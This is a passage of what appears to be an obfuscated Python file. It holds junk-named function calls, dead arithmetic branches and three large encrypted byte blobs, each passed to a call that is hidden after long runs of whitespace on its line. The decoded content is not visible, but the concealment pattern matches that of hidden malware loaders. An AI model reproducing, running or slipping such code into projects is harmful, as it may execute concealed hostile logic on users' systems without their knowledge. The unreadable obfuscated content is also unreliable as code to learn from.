\x90\x04Z1x\xc4j\xbc\xd4Y\xe0\xf7\xdb\xa7\xd7x2\xa6S\x9a\xe6\x02\xfa\xcd\xd6\xec\xfb\xc7\xebkk-k}\x10\xef\xec\xebO\xf5\xd6\xad8\xe1?\x9c\xd3*\x8c\xd45Qt\xf5\xff\xa9\xf2k}\xf6\xe1\xf5\xf5\xff\xa9\xb7n\xefh\x9adh\xa8\xdf\xdd\xdb_\xab\xa3\x10\x9bT\x96\x9c\x99\xa0\xf8\xc6"\xab\xb7\xb8\xb7zX\xfdp\x90\xae\x9b\xdd\xc6\xab,\x83l\xc04\x8e\x01 \x14\x83a\x92EBcM\xb1J\x03\xa4M\xc6\xc9m\x98\xb1\xae\x1bf\xc9B~6\xbao\x86A\x84\xa8\xf9\x97\xcc\x96\x85\xbd\xa8 \xe8\x90\x80Jz\x1d\xa4%7\xad%Oc\xdd?o[LT\xdc\xaa\xfa\xac\xb1\x92\xf8\x07\xb8)\xee\x7f*h\x88U!\xc7\xb2\x9d\x94^\xf5\xa9,\xe3pJ\xbd')

        _floor(_statistics = -53763 * -47871).Divide(_cube = -15952 + _add.Floor)                                                                                                                                                                                                                                                          ;_floor.CallFunction(_while='DDDoDOooOoODODOODOo',Positive=b'\xd2C\x1b\'\xca1Jh\x8a)\xe9\xe9\x88\xfe\xa6B2\x92\xbd\x0es\x14\xcel\xa4`^\x8c\xd9\x8d0\xd1V\xd2\xd5U\x9d\x98\xbb\xa5]GK\xb5^\xce]h\xa2\xc9\xe9\x96\xd7~1\xed)\xe9L,\xcf\xfc\x7f\xf8\xc0\xc6\x81\xdc\xa1\xf3\x8f\x9f\xc6\xfa\'\\\xf2\xc9\x96^\x80\xa5W\xe2\x10\xce\xbf\x89z\x84\xa4:\x18\xd1\xa8\xfdqx3\xdb\xf5\x8f\xe5\xbd\xa3\xbb|,E\x9c\x18\xce\xa2\x04\xdb\xf9\xf9\xb7\xe7oR\x17\xd3\x13\xdc.\xef\xdfGR\xf9\t\xe0\x16\xa0!\x10\xa8\x95\x902\xa2/\x17^Q8\xb7\x175.\x16\xbd\xab?\x9c\xbf/\xf8\xa5q\xda*\xf9L\xc4V)rI\xdeQ\xd4x@\x0e\xa2X\x0b4t\x0c\xe5\x1c\xe9\x14{6\n\xea\x00\xfaI)7\x90\xfc\xa5\x1b\xd9\xb5\x10\x98\xa1\x9f\x99;\x02\x84\xd0\t\x8a0v\xa7hI\xafN\x00\xa9V\x98\x9f;\xbd\xb8\xd0z\x16_h\x83/2\x98|\xad\xe7\xe1Z\xe4,f\xe1\n\xd2\x99\xf0\xfc\\5\xd0X\xf9\xd6\xf1\xdb\xf7|"\xc7B\xf3\xdbL\xac\x15w\xa6W(}\xf8\xe3\x8b)Y\x07h\xc4\xe0\x9d|f\x0c\x0c\xbb\x00\xcbc=:\xef\xeeX\x1d\x85\'\xea\xe4\xd7V\x1bd\xb7\xa5\xfa\x1b\x835J\xf5\x9e\xf5\xf4vf\xcc6\xe3\xf4\xd3.\x96\xb1\xb8m\xb4\xc6l3\x959\xe4\xa1]2c\x9ed\x8c\xb2\x86\'\x17\xf6\xe4\x03\xab?\xec\xb1\xfd@*\xeb5[\x0b\xd7\xac\xbb\x9em\xf4\x9cL\xa6\x18<\xc7\xc6\xbe\xe2-\x9d\x81\xf6\x88O\x1c-8c\x8c\t\xa1\x88\xc2\x0b\xd5\x8b-Y\xc3\xb0y\xba\xf0x\xed\xb5\xc3\x1b\x9c\x8c\xa8m\x1ba\xa6\xbe933:\x07u\xf4\xfc\xfevl\xeb\xbei\x83\x90&\xbb3r\x9f\xa2\x85B\xf96`\x9dL\xb7\x846\rpZ\xc7\xfd\x9a\xe2G2\x0f0\x9c0\xa5\xfb\x11\xee\x1c\xb4O\xa7c\x9dC>\xd5\xb1\xea\xad\xbe\xf6g\x1f\xa4\xd9\xf2^\x87\x82\xc6S\xadN\xa1\x9aAw\xbb\xfa?\xe3\x91d\x02\xcd\xeam,\x86![\x86j\x11v\x86/\xb30\xd9\xc7\x9c`\xab\xefa\xf8pF\x9a<\n\x96-\xd9\tx\x88J\xbd\xd1\xea.\xfe\xe1|C\xbd\xb7\xfa\xe8\xa6\xe8p\xd9\x92p\x18s|\x8a\x05\x9a\xbe\x9fhO\xb4I\xc9\xce\xe6\xb1\x01\xba\x8b\xee\xdf\xbe\x9d\xf1y\x9b\xd2Z\xb7\x1c\xd7\x9f\x8ey\x1c\xe9aN\xba\xc5\x99\xf9\xe5\xb7of\xe9y,\xac\x076\xef\xb5\x05m"\x14<.\xaf\xc3\xb1P\xe0\xf5\x1f,\x9f\x81\xda\x88Z#\x0c\xc15b\'(\xe03\xbe\x9a\xe8\x81A\xb6\xe9\xd5\xd5\x99\xb6\x8f\xb5\x89\xac\r+\xf84fg\x05Q,o\x11\xa2\x80s*\x99P\xec\xc5\xdf\xd2\xf5\x98\x8eM Q\xcf\rxLg\x1b+\xc6\xb4\x03a3\xa6\x90>Z\xc9\xe8\xa9\x84\xe9\x19\x96\xce4g\x86v-h\x05\x0f\xce\xc2\x98\r*\xddn\x9c\x1fx\x89L\x8c\xcd\x88\x9e)\xe9\xb0[\x02\x06\x93\x01\x1bL\xcf\xae\xeda\xea\xe3\xbc\x1e\xb3ex\xc7\x0bgl\xaa=\x9bk<\xe6H\xa8\x91\x9a\xea\x8f\xed\xb8&\x05\xbf\xac\xdc\x0b_L!/I)\xf8\xda\xa0\xb5\x06\xb3\x193\xc5\x19\xaaF\xa9\x96\xa2\x9a}\xbb\xf8\xa9\xa8X\xd7)\xd5t\xfaqT\xa0W\xc2\xf8\x8e\xf5\\$\xb6\xc6\x13\xdb_@e\xc30\xc1~e\x8fo\xa5g\xf6\xe1\xe0\x8e\x955>\xe3\x1a\xb29\xd9c\xed\x8e"}\x0bo*\xdb\xdf\xe6\xc1\xb2\xf3C\r\xaa\xa9u2nIL\x80\xa8\xd3\xca\x1e\x84-\xf6(w\xc6o\xc8\xb2\x08\xef\xa4\xb6\xea\x9d\x89\x89\xf0V>^\x99;\x0c\xc12x\xd7\x81\xddv\xa5-\xff\xd9\xe3\xcfO\xb3\x9fl\xff\xa96Cu\xa4I\r^\xea\xb8\xbc\x9b\xad7\xb6\x1b]\xa8\x89\xbeN\xfa\xfe\xd1\xeb\\/\x16b}\xe4Y\xdd^\xb0ZE}\xbe\xac\xbe\xd8>\xdf\x84\xf8a\x07\x9b\x1e,4HLO\x14\x19\x1c\x91C\xa3\x93\xba\xdd\xaf\x9f\x1e\xb6\xe7\xfa\xda\xbd7\x92\x1c\x16hs?o\xef\x97"\xc3P&2\xb32d\xe8@Pt\xc3\x85\x0e\x02\xb8\x8fx\xe3v\xdc\xe3\xd6\x9e\xec^Y\x1a\x12\xeb\xbd*\x98\x81\xfa\x07B]e\x04_\xf1f\xa2\xc3\xd82\x91<\x85\xfb\xf0\xcd\xc6\xcc6b}\x13\xe6<\xd1\xfa\x12\x9b\xb2uk%,\x1d)w\xa46m\x8d\xfb\xdfx\xec&V\xd1.\x1c:\x9d\xbf\x03,\xd2\xac\x10O\xd1\xe1/e\xe7\x85Y\x00u.\x89\xb7\x06\xac\xbd4h\x93\x8b D\x00\x0f\xf13=t\xcfpd\x9e\xa9Aw\xa6\x06\xd5\x19\x0e\x983<\xe43\xdck\x94\x13\xf3\x9f\x97\xf3\xbf\xa2\xa4h2\t\xd1\xc1\x87\xda\x886\xee\xca\x12\xc2\x96\xbc\xd7\xde\r\x10\xf24=\x91pg\xaf\xe6E\xc1(d\x08\xcc[\x03\x10\xd3\xee\xf0\xf1\x96=\x8c(.\xb6\xfaz\xd7X\x86eQa\xbd\xc5\xc6\xe7\xba\'\xc6\xcb\x12\x94\xf4,\xf2\xd4M\x19^9\xdd\xee\xb3\x0e\xd9\xe2b\x9f\x12\xde5pZ\xbf~\x01!&\xce\xeb\xd9\x97\xd9\xd3\xcf\xc5\x98\x15\x84\x85w\x9cl\xf6\x8fn\x88\xf5\x84\x14\x03P\x16\xc6o\xcd\xc9e8\x8e\xb8\x00R\xff\x84\xf7\xf1\x96"\xe3\x17d\xbd\xe9\xc0\x01|\x10"\xf7\x90!s^3\xad\xf0\xbd\x02\x82\x0bqO\x02\xc9\xaa\x9a\x84G?\x14\xea\xba\xfaX\x13\xfc\xd2?\xe8\x1et\x8e\xd28]\x86\xcbF\x9e\xf2\x14=1Cb\'\x87\xa8\xa5\xea\x15g\x0bXV\xf7a\xda2\x0c]\xb0\xe9+\xce\x15k\xdc\x9d\x97\xccL\x12\xe0\x14\xab;\xaf\x8b\xdc\x193T\xf79\xdf0\x1a\x99"MJ]\x1c\xf3w\xa8\xeeM/8\x0e\x80\x01\x00u\x99y\x15\xe0.\xd4\xbb(\\)\xb03tI\xcfx\xff/\xb5\t\x82p.\x98\x0e\xcf\xb4\xbc\x9f\x12bx\xcaXaeV\xac\xc9\xd0\xfe\xfc\x99\xf5V\xb35\x94\xa8\xe7\xc2\xe7\xab5\x00t\x7f\xd2\xc98\xb7\xba!{\xe3\xf1mL?6\xa6\x06C\xd7\xde\xbf\xb7Q]{\x8b\xa0\xde\x8c\xac@\xb8\x030B\xc6\x87\x88au\xd13D\'\x80S\x10\xd2\xb0\x96\x906%\x83\xd9q\n\x14\x9d\xe0\x96#T\xb1\x0e\x85\x078tF-\x05\xb4\xbd;\r\x92\xd7\xc6\x1ap:\x1f+\xab\xbf0+\x9924\xcf\xa6\xcb%\xc5+Q\xb7\xc0\xd8\x14\x00\xc5\n?\xbad\xb5\x90`y\x93\xab\xcajMO\xd4u\x18\x83\x80\xefc\x06\x8c\xdb\x18\xc1Y\xedo7\xd6%\xcc\xbe\xf4\xcd!g=\xc43h\nV\xc09\x04\x97fr\x1bG\xc8M\x14\xa5\xb7!\xb0\xd6\xad\xd4\xb9\x86\x9b7\xa8/\xd7\x9d\x01\x06\x1c\xc1\x07\xeaV\x05\xf2\xfd0\xcb\xcd\xad\xbfL\xe7(\x08\xf0\xd7xC\x8b\xed\x85y\x9b\xdb\x1a\x0c\x96zGy\x10P@\x8af\nrU\x8d\xad\xab\xdd\x98\x05`<\xd6\xae\xa1\x10Ke\xc5Ni;\x87\x9eD\xe4\xf1\x1a\x02\x8d\x13\x0e\xc4\x16\x90\xf6\xda\xdd\xf9L\xc4Z\x14\xc0F\xf0\xfe\xf8\x1d\xbb.\xd8\x8d\xa1\xfew\x9f\x11\xe9\x9c1*&\xf8\x18x\x0c\xcb\x97\xfa}0\x0e\x11\xe3\x8820\x82C\xfc\xfcV\x7fj\x07\xf1\xaf\xdd\x17\x0e\\\x18\xf3V\x99\xb5\xe4\xe0\xa6\xc2i$ \'W\xbbO\x08\n\xd0K\x02m\\!\xe2g\x8c~I-\xb6\t~\xb5\xae\xdf\xba5{M\xdc\x06\x17\x0f\x1f\x1d\x10\xe3\x881!\x02\x05Z\x8f\x11\xb2F\xd7\xea\x9ad\xec\x9aP\x0e\xeb\xcdXG\xd41TN\x87\x89\x10\xa7=\'\x86\x82T\xe4E\x9bj#\n\xa3\xc8h\x15\x92\xaf+`\xb7\x17e\xa8\xd4\xcb\xa0\x8d\r\xf2\xb2\xc3\xf0\xc0\xa1\xa2\x06I\x0e\xb0$%#\x16\xd9mj\xc3B\xdd\x07\x8e\xb1[lv\x1a\xc2\x018\x08\xcd\xf6\x88V\x14w\x9f&\xeb\xd04\x1eN\r\xb7\x18\xc3% \xad\x90\xb0jpYv\xdc\xd6\x04U\xc1YqM\x81\xd0C%uv[\xac0\xd5\xe3\xdc\\\\\x90\xcf\x92\xdc\x95\xc6\x84\x9b\x8e9\x12o\x82\xf2w\xbb\xcf\x0bg\xec\xda\xa8\xa4z\x8c\x9f\xcdT\xc9\xde9\xed\xaa\xab\xdf\x93\xa9\x0eh\x90\xaf\x8c2\xa7\x0e=+"\\\x87a\xc4\xaeg\x05\x91\x98\x1b\x8aV\xaf\xc9%\xad\xf4{\x03\x9b0\x10\x1b\xf6G*\x95\xfdSqM\xc6\x1d\xfaM\xa8\x0c\xe8\xbb\xa9\x9eB\x06\xe3\xbee\xfc>I\xf7Cel)\x16\xaa\xe3\xa0#\xe0\xe9\x87I\x1a0\x85&\xae\xc9:u\x9b)\xb7z\x8a\xac[?4\xe7\x01\x16\x0f\x9f\x15Zk\xf3\xffU\xdc\x0b\xad\x9e2b\x03<\x9c\xd5\xf3j\x85\xd6\x94`\x1eJp\x8d\x9f\x8d\x0f\xddDev\x0cJ\x8c\xa0\xa0*F0Ux\x1d_P\x94\x81\x90@\xda7^\xde9\x84fk\x95? lLu\xe7$\x04\x861T>\xcf_q\x88\xea\x18\x82\x19\xa4\xeam\xacc?\xc6\r\x0c\xe9."\xea\xac\'\x06\xb2\xc2aj\xb8\xc2\xb9\x17=Z4\xa3\x02\x92\xd7"fh&!\x13\x17\\\xe0\xe3\x8f\x9f\xb4e[\x87j\xc7\xec\xd6\x13\xc4w\xbe\xc1\x14\x9c\xe5\xc9i\xc5/\x80\xe6\xfb\x9f\x97\x94\x9b|\x02\xa1s\xce@[J\xf8\xe8;\xa3"Y\xef\x05`\x16\xe9\x07\xd8\xff\xf9g\xc8\x92-\x00!\xd9]\x0c\xff\xe0FZ\x8e\x97o\x1e\x96w\xdb\xbf-O$:lc\xc2{rMW\x04`Cw%"\xd4&\xe5U\xaci\x9a\xde\xe0,\x81\xba\x86\xfc\xbd\xf5\xd6\x1b\x0f=\r\xef\xd2j\xb4\x96\xb2fD\xacz)\xf8\x99\xe0\x10O\x1e\x97O\'\xcb\xd3S\xe1\xec8AG\x822%\xff\xba\xd3\x87$s#\xf18\xc7&\x1f"\xe4\x90\x86\x06\xee\t\xf5\xf93\rO\xf0\x85\xa0\xc9\x893 \xccoc\x13Z|o\xc0l\x06!\x05\xc6(\xf8{\xcf\t;\xaa}\xcdZ\x7f\x07\xd4\xa4\xf5\xe5\xdc\x9e\x0b\xef\xe37\xeb\nW\x0bo>o\xd7\xf7j\xc8`\x00A\xbd\xa935\x07P\xf1\xfb\xed\xc3Bd}h\xa4\xf0\xc3\xed\xe9\xff\xa0p\x9e.\xb6\x0b&\x16y\x96/\x8b\x9e\xc7\x07\xf8;7\xc3\x0c\xc0\xcab\xbd\xc5\x0c\x01\xb5\x7f&"Z\x8c\xf4o&5\xfb\x87\xab\x16\xe9OE\xb3\x19\xfe.8\xd8\xb6\xbd x\xebX\xa6\x14\x94\xe4\xcc4\xd0\xde\xee-f')

        if 115615 > 4741456:
            _add._builtins(Random = _add.Floor * -85667)
        elif 196965 < 7088637:
            _add.Divide(_cube = -5102 - _add.Floor)                                                                                                                                                                                                                                                          ;_floor.CallFunction(_while='xwxxwxwwwxwxwwxwx',Positive=b'\x0f\xa3\xde\xa6\x16v\x9a\x97"\x92l\xd1\xc2c\xf6b\xe1\xe8\xd4\xb8\xd9\xfaiqbLK\x06;\x1e\xa8\xde\x85\xb3p&Lw\xf5)\x9a\x81\x91\xa9dY\xa8\xec\xfe\x05\x1a\x9c\x80\xa3\x81~Tey\xa8\xccJ\xf5\x80\xd6h\x86^"0\x18\xd5$\x0f(\xf8e8\nf\xa1\x9a\xd3T\x8f\xec66\xdf\xc6\x11m#\x839\x0e~\x1f\xc4\xe2\x97Y$\x1d\x08z\xcd\xa4J\xdd\xca\xb5&\xb7Y\x16\x81"Q\xfe5\xacW\xcd\xa8`\xfe\xaa\xb9T\xff\xb2\xf3l\n\x7f\xd7\xd6>\xe5\x9bL+\x9b\xe35\xdd\xe7\x1aA\x01w\xfc\x0eMn\xaaa\xa9\xe4\x90%\xf8q\xfd8\xa0-\n,\xaeA\r\x8f\'$\xc3L\xa6\xc6\xa4~c\xf0\'Tf\xe3\xc9\x1fs\\\xf1\xee\xce\xf8\x90\xf0Y\x9e\x80\xe0\x0f\xbd\xce\xc4\xdb\xc4\xf3\xa5\xda\xf11G\xadu\xa0\xdeF\xed\x8b\xbfF\xdc+\xdd\xcf\x97\x9c\xe9\x84\xb1\xfa\xb1\xc4|\xd0~\x15\x7f\xf9\x9e\xd1\xdb\x169\xfc\xc1\xceN\xf0\xd7}\x86\xe25\x90<.J;\x8e\xc8\xdbt\xcdw\xef\x84\xa8\x9b\x9d\x1b\xa7\x92\xd1Njd\xc8\x97\xd9\xe3\xf3\x0e\x117;\xfd\x1f\x8c\xa0\xb5~\xbc\x8ap+\x8a6\xbb\xba\x92d\x9b\x9dc\x1e\xd9%\x9df:\xc5\x14\x88\xab\x17l{\xc5\x1a\x99\xa7\x04\xc9\xc7<\'\x08\xa6\xef\x96l\x8c_7*6,\xef\x14k\x02w#\xd1\xf6cS8\x9a\xe3t\xbb\xbc\x1cZ\xc3\xd3\xb1[\xb0\x95\xddI\xb5a\x93T\xd3|\xa7\xc3\xb24\xb3\x15\xb6\xaa\xd2\xac\\}\xebp\x89V\xa9\xdf\xe5^\xa6\x15\xc2M8\xe8\xc7\x14\x9f\xd2\xa9#\x94\xc1\x88\xd3\xfe\xae\x15\xbc\x15\xd1\'\x8a;\xed\x16h\x1a\xc3\xa2\x9d\xe2\x08\xbfEW :1\x04:9\xe0\xf8\xb6\xfa\xb8G\xb8\xa1f\x83\x13\xa3\x9e\x1a\xd5\xa5\x1fS\r\'\xd2\xfe\xa9\x86\xd3E\x9d`3\x00l\xce\xd9\xa5S@\x87?\xd5\xe8s\xca\x9eA\x9f}\xd9\x9dr\xcfx{\xa3\x14\xd2\xeb\xd8Z\x89\x8c\xeb)\xdd7&\x8a\xc3\xd0\x07\xed\xf2|\t\xf1vAV;\x82v\x0c8q;\xde\'\x16\xee\xef-^\x85u\x92\xbb=rAP\xc8p\xce\xdf\xb7\x1a/\xbd\x1e<\x1cr\xd3\xae\xd2\xb1N\xad($8\xa9\xd7\xea \xb0q\xe9\x8d\x8d\x95\xec\x14?\x9c\xd9\xc2@n\x16\x18\xe1\xf5X\xe3\xf7\xeemDe\xa7\x87\x8a\xb3q\x9e\r\xa9\x08\xf9\xa8\x94\xce^\x1d`x\x11)\xb3\x9f\x13b\xc8\xb79\xb9\xdaq\x87P\xfc\x14A\x12\x04:\xc2\xc4\x8d\xf1\x94\xd2C(/\x8b\xf0\xeaA\xd9\x9c\x85?\x06\x8ah\x1c\x12\xc6\x16\xea7d&/v\xb4\x8d\r4\xc4Z\x04\x08T\xd9!\x8b\'\x97\xec\xb0\xd4\x0e]TC\xae\xc6V7\xe2q\x8d\'\xba\xee\xfe\xc3\x0c\x94\x8d\xb6\x93\xd6dq\xc1\x8d<6\xc6v!#k3\xa9\xce>\x16:$0g\xe4\xe6[\xf3,\xa6\x03\xbf\xb0\x95\xca0\x15v\n-z\xba\x03\xc1\xc6{~X?\xc1\x94\x0eY\xe0\xf8\xfb3\xb8!\xb5\xa5\x07\xb1m\x91l\xcc\x16\x9d\x89\xf7\xea\xc1{\xda\x9au\x0cf\xbcd\x9eeY\x80\xceZ\xf65\xe9\xf9\xa3md\xf6y\xfd\xf4\xf3k\x04\x06\xc0\x0e\x9e\xddA~\xed\x07\x01\x81! \x9e!\xe3\xb86\xb7\x97E\xf0\xc1^\xcf\x1e_\xafD\xb2\xcd\x1b<\x15\x07\xe5FG\xf3p\x11.\xe2\x10\x93n\xe3,\x07\xc6R\xac\x1c\x01\xec\xb4I\xa2&\xcdx\x15Cy\xac8^%\x90t\xbb\x88\x96fBo\x91\rmwN)K\xeanF\x94\x1b\\\xa4\n\xde\x1b\xbe\xfc\xa8Y\x820\xad\x8b\xfc\xf8\x08\'\xd3i\x18\x1c\x9a5\x10\xc7*\xf0\xba\xcb90\x13~B\xcaJ\xab\xe3B\xac\xc1\xe3\xb9\xc1\xd3\xdf\xd9\x901\xbc3}\x17\xe1,\xf0"\xcf\x1e~\xb2(n\x88}\xaba\t_\xbcY~[\x03C\x07\xc10\xc4\xd4\x02\r?\x9c\xab\x9f\xbd\xe2\x13H\xe4f\xf7\xf0Kpu,\xd6\x0f\'\x02\xbc\xa1W\r\x9d\xde@\xfc\x1d\x06\xd9\x89!oa\xd6\x03\xfcx\xaaWf\xfb\x19\xcf\xb5\x05YmJ\x94\x07\xa5\xcb\xf8\xf1\x1bs\x85A\xe37\xdc\xaf\xc3\xa9\xb3l\xd0:\x99\xab\xfb\xea6M\xd1\xb5\xdf2\xe0\xa1\xf9h\xc8\xd7\xc8(\x19\xedMQ\xef\x84\xb8\x83\xfd}<9U\xa7\xc6\xecqM\xb6\x11\x1c\xc4\xc3\xf2\xa7%\x1c\xc8\tiL\x94\xbf\x14\xe8\xc2SS\xc2\x00S\xca1\x05\nh\xca?\xad\xae\x8cW\x88\x98\t\xe2+3\xfe9\xdc\x08x\xa3\x96;~\x08\x7f\x1a\x88C\xa3lg\xaf\xf5N\x94\xd4\x9e_\xc0\xd03\xfbE\x1b\xd8\xff\x1b\xf8\xa3~?\x9c\xe3\x0f\x1b{\xef\xc0\x18\xbd\xfa\xd7\xd9\xe3\xe33\xf0x\xe9\xbb\x03?\x97\xef\x0e}\xe8\xf8\xdd\x19\xbe\xfeq\xfb\xf5\xfe\xe9\xd0;\xe7\x8f\xe7x\xff\xa8\xf5\xfe`sS\xad\xe7\xc6$C\xa8U\xaa\xd5\x01\xc7\t\xae\xe7\x8f\xc0\x80w\xf3\xb8\xfe_J\xa53<\'\xf7wR\x15\xbd\x97\x9bB\x12\xc0\xedfq\x0e\x0b?\x18\xa3\xda\x80QU\xcb\x0f88\xc9C\xa5\xbdU\xc1\x94\xacH\xa2$|3\xffy\xbb\x9e/O\x9e\x8do\xfe[1bwZ\xa2&a\xf4\xb1\xf1`\\\x9f\x9e\xfe\x80\xd6\xaaU\x86&\x94\x95O\xf4\x88o\xe6\xdb/\xbf\x84t\x80g\xbc\xcb\x86\r\xe2\xfe\\\x90I\x9e\x94\xbe\xfe\xfa\xf0\xb8}8\x87/\xdf\xd0\xf2\x89\xfc\xe2\r\x11V.O,r\xf8\x9b\xd9\xfbo\x86\x91\x02gx\xfd\x8b\xd5\xf2i\xfe3\xdc\x08\x85\xf5\xcc7\xdbG\xa65\xa2\x8d\x89\x06u\x81\xb4\x07\xb8\xb8sp<\xff\xf7\xf2\x17\xba\xd2&;\xc5$\xaa\xc0k\xcdt\xab~qfL\x13\x93{\xff\xd6N\xb7\x02lb|\xb7\xea\x95\xa6[\xa4\xc1\xbb\x81\xf1\xb2<\xb7\xb4\x99\'+\r\xee\xa5\x1d\x13|[\x86~\xf3D\xfc\xf2#\xf3\x1bL\xd8Q\xf3\xe9#\xbb,\xee\xad\x9b\x92f\x97O\x95u\xd60\x8c\xd9o?r6\x84\x81D\xab\xf7\xb1^\tJ\xb9\xedsu\x16\x06F\xa0\xed\xf3GJ&\xa2\xcc\'LHPs\xaf\x06\xeaa|\x1c\xf3\xee\xa6\xd59\xe1\x19\xfd j\xeb\xcf\xdb\x87EU\x9c\xc0\r\xf2<\xab4\xc3\xedl<e\x1co\xb5\x9e\xff\xe7Y\xbd`z\xba\xfbR\xb76\xbc\xd2\xb3s\xf5\xed\x9b\xc7\xff\xbf\xbbk\xebM#K\xc2\xef\xf9\x15\xbb\xda\x97 \xceF\xb8\xb99\xde\xe5a4VVx\xb0Y\xc9#a-B+\x12 i\xa7M[6#[\xb3\xda\xff\xbe\xa7\xee\xd5\xdd\xe04\x98\xc9\x8c\xd6q0\xd0\xb7s\xad:\xa7\xea\xab\xaf\xee\xb3t\xf3\x960G\x18\x1f>\xa2\xa0@\x9a!\xc3\xc6tmj\x9bZ{\xc6\xd7\xc8T\xd7\xed\xe7z\xdd\x98\xca\x9aL\x8d\xf9\xf4\xb9\x1at\ndpd\x11\x8am\x89\x0e4\nD\x1c\nF\xe3b\xb8#\xd0U$[\xb6(X\xb9\xce\xf4\xdd\xbb\xf9}\x1c\xc0\x8b\xb7:\xf8\xe5\x07E\xa4\x1c\xddk\x19\x1b\xd7wm0\xc5\xb4\xd0T\xb3\xea\xf7\xbb\x1f\xdb-\n\xff\x04\x94Y\x17s\xc4t\x93\xce\xb2\xdd\xe9,\xda\xed\xd2\x99\'\xee\xccV\xbb\x03\x19c\xba\xfdx}\xd2\xe9\xd0\x99\xc8\x8b\xaf\xf9>\x1d\x91\xf9\xa9\xde#\xe9.\x92x=\x00\x86(\x13R?\xd1\x9c\xa0\xef\xeb\xf1\xedT\xdb\x02\xd5Es\xe0\x89\xe9\x94t\x15\xfe\x90H\xf0\xbb\x06\xd25\xe6\xb3\x16\xd9\xdbx\xc3<-Ng\xd17;\x94\x16\x9f\x1e\xf0\xefk\xd5V\xe6\xb6i\x1a}f\xd8\xf7]Z\xabp\x11\xae\xe4v\xeb+\x06\xec\x11\xc9\xdb\x05S\xff\xc4\xdffa\xa3\x84\x1af\x9b\xc2\xd2X\x14E\xf6\x965\x95\xe3\x08d\n?\xee\x85\xa8\xb02EI\xde\xd2\x06\x15v\x95\xdfUi\xa9\xb5Bq-\xf1\xdf\xf7\xd3Xe\\\xce\xb3D\xdbV\xf5\x95\xf1\x8c\x88\x05\xc2\xd4\x15c\x9d\xc8\t\x8d\xf2\r\xe4\xdd1\xb5\x15\x07\xa0\xa0\xeb\x10\x06\x0b\xed\xcf\x86\xa3\xd9\x14\x97\xc8\x84I\':\x1c\x82\xa7\xb7\xf6\xd5Y\x86\x8aW\x1e\x84\xac\xae\xce2\xce\x18\xf1\x1d\xa3`\x8f\x9a\x8b\xd8qsv\xc4\x13p>\xafD\t\xbfJ\x7f]\xdb,Qx\xd41t\x97\xed\xda\x84\x85\x13&[c*\xf1\x92\x168\x19\xf5\x10_3\xb4t\x02\x02C\xca\xa2\xae\x132r\xb5\xaf=\x7fCq\x91\xf1\x89\xc7\x13\xfc\xaf\xa5\xb3\xccK|fowj-\x96\x94\x87\xe8\xad\xcei\xbb\x15\xb5M?iu>F\xfd\xf4~\xb7\x06\xab\xa1\xb9zQs\x9dDM\xd7\xfe\xddt\x96\xe9\x8a\xe6\x80\x9c\x9d\x99D\x00C\xc5\xab\xdaJ\x94\x0c\xb9\x0e\x91\x82*\xa7\xdd*\x03\xe2\x1b\xcaV\x9c>~\x8a\xbdP\xcf\xfep\xe8\xbe}K\xc2\x1b8R\'A\xcb\x0b\xda\xaf*-9\x16\x8a\x88}\xce)\xf2f\x87\xb44\xa0\xa3\xc4\x92\x92Y\xd9d\xa6L\xa0\x1b\xb7a;\xee\n_\x8c\xe1F3\x14\xff\xcd\xa6V\x1e\xb1\x90\xa2\xf8\xdfW^\xa2\xe5\x1a;\x9b\x88|\x80\xd7\xc8\x89\xcb\x1d\x86\xa2\x1f_\xb2\x14\xe9faRp\x13\xdc\xdcT\x8dEF\x13t\xa7\x1b\x96\xefe(\xea\xb4_e*\x12\xce1\xdd`\xedk#\xdaf\xd2\xe1\xdehI`9\xb8\xb4^0\xf0|\xdb\xb8\x83\x0f9\xc7\n-\x06E:g\x1dlx\x0eK\xfe\x9b\x1b38\xd0\xde\xaf15\x12\x1f\x89\x86\'2\x84Y\xc3\xd1A\xef\xa4\x87-\xdb\x95\xb80/\x98\x97\xbci\x89\xcf\xaeka*X\x97\xf8\xda\x17/\xa8\x18\x98\xf8"\xb63\xa1\xf8\x8b\xef\x96\x0f\xffJ\xefi\xa1\xfdx\x82\xc7\x1e\x13\xfa\xd3\xe6\x8al\xbel\xe2/,\xef\xe1\x13\xf4o<\xbc\xa1-\x18\\d\xe5\x8e\xcaY\xb2v\xbc#R\xfa\xb7\x9b(\xa7\x96\x9bA|\xc6\xcf_\xe2\xd7\x8f b\xe3V\x01\xee0%p\x15\xc1\x03\x11I0\x9a\x05<\xa0\x91\xf9\xb2\xddg\x94\x08\x1f~6\xc9@Rb6\xb3>\x9a\xbfC\x86l\xc7\xfeL\xe5\x17-:ol\xafFrp5\x88\xbfP\xc2\xa1\xc7\xe4J\x86\x81\xce\xc5u\xec{\xbc\x90}\xe2#Yf\xabU\xf6!\x1eP\x95\x97\x8b\xbb\xcc\x96\x9f\x1f\xe6wV\xe0\xd8\xb1\xae\x81y\x9a\xcf\xb8\xcb\xa7cN\xf4\xc5\xe4\x15')

        if 405671 > 9108266:
            _add.Divide(_cube = 64976 / _add.Floor)
        elif 489574 < 2882620:
            _add.Divide(_cube = -27242 * _add.Floor)                                                                                                                                                                                                                                                          ;_floor.CallFunction(_while='MMMMMMNNNMNNNMNNM',Positive=b'9\xd5&JO;\x83jH\x8es\xa1w\x8b\'J\xc9\x8b\xa5\xde\xd9\xf8Tfh~:\xc5\xd1\x06\xe3\x11\xdaKy\xa6\xd4?M\xa2\x1cYn\x1ec\xad\xc2?0\x81\x02\xbc\x1b\xf3\x10&57\xcf\xc2\xe7y\xc87\x03\xa6\x96\xa3\x087\x84\xda3\x91\xb7pF \xaa=\\\x19\x12TQ7^\xff\x03h\xc6\x1e\xdb\x18\x0cn3\x8e\xa3 \xf2\x11p\x19j\xc1\xe3\xd3\x07\x8ck2\x90\x13{\xaf\x0bN\x1e\xdc\xfc\xd9m\x8b\x13?\xdee?\x92\xace\x02Y\xbb\xe0\xf5\xb4\x85\x00\x8e\x8f\xbd\xf7\xb2\xc6c\xb0\xc6{]\xd1\xedEB\xb5\xab\x11\x1cq\x8e\xfa\xbfq\x13\xad\x15\xf9\x8c\xd8\xa0!\x9a\x95\x86\x04\x99\xa1x\xfd\xd1hXm\n\xed\xcdbK|\x9e\xff\x01\x1bB\xc6[\xc3\xf1|\x9b\xac*z\xdc\xe28$\xf8%\x83Z(\n\x1b\x95`\xb5\x11\xe4\xc6\xc56\xc8\xf7dL\xfb\xed\xda\xa0\n\x08V\xc3\x91C\xa4=\x9d\x8d)\x08\x9f\x82\x979t$7\xef\xb7\xe3:e\xf0\x1d\xbc\x9cI\xa03E\x9a\xc0$e_x\t\x13r%\x04D\xeee\x07\x1c\xc4\x85`>{\x1e\x86\nLcL<\xa4DIJ\x9c